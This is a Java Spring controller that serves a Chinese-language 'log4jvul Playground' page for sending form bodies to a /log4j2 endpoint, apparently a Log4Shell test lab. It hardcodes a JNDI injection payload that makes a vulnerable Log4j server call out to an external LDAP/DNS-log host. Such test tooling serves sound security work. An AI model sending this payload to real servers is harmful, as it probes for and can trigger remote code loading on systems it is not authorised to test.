package com.myapp;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class PlaygroundController {

    @GetMapping(value = {"/", "/playground"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        String attack = "name=${jndi:ldap://sectest-log4j2.dnslog.cn/a}";
        String normal = "name=1";
        return "<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"UTF-8\"><title>log4jvul Playground</title>" + style() +
                "</head><body><div class=\"container\"><h1>log4jvul Playground</h1><p class=\"hint\">表单会发送到 <code>/log4j2</code>。可先填充攻击/正常表单，再手动修改后发送。</p>" +
                "<label for=\"payload\">Form Body</label><textarea id=\"payload\"></textarea><div class=\"actions\"><button class=\"attack\" onclick=\"fillAttack()\">填充攻击 Payload</button><button class=\"normal\" onclick=\"fillNormal()\">填充正常 Payload</button><button class=\"send\" onclick=\"sendCurrent()\">发送当前 Payload</button></div><label for=\"result\">响应</label><pre id=\"result\">等待发送请求...</pre></div>" +
                "<script>const attackPayload='" + esc(attack) + "';const normalPayload='" + esc(normal) + "';const payloadBox=document.getElementById('payload');const resultBox=document.getElementById('result');function fillAttack(){payloadBox.value=attackPayload;}function fillNormal(){payloadBox.value=normalPayload;}async function sendCurrent(){resultBox.textContent='请求发送中...';try{const response=await fetch('/log4j2',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:payloadBox.value});const text=await response.text();resultBox.textContent='HTTP '+response.status+'\\n'+text;}catch(error){resultBox.textContent='请求失败: '+error;}}fillNormal();</script></body></html>";
    }

    private String style() {
        return "<style>body{font-family:Arial,sans-serif;margin:40px;background:#f5f7fb;color:#1f2937}.container{max-width:920px;margin:0 auto;background:#fff;padding:24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.08)}textarea,pre{width:100%;box-sizing:border-box}textarea{min-height:180px;padding:12px;border-radius:8px;border:1px solid #d0d7de;margin-bottom:16px;resize:vertical}pre{min-height:180px;padding:12px;border-radius:8px;background:#111827;color:#e5e7eb;overflow:auto}.actions{display:flex;gap:12px;margin:20px 0}button{padding:12px 18px;border:0;border-radius:8px;cursor:pointer;font-size:14px;color:#fff}.attack{background:#c0392b}.normal{background:#1f6feb}.send{background:#111827}.hint{color:#6b7280;font-size:14px}code{background:#eef2ff;padding:2px 6px;border-radius:4px}</style>";
    }

    private String esc(String value) {
        return value.replace("\\", "\\\\").replace("'", "\\'").replace("\r", "").replace("\n", "\\n");
    }
}
